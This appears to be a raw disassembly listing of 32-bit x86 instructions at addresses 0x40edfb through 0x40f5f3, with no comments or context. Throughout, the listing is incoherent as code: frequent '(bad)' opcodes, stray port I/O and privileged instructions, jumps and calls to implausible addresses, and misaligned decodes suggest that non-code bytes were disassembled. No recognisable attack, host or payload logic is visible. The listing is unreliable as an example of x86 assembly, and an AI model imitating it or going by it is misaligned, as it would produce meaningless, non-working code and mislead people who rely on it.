  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
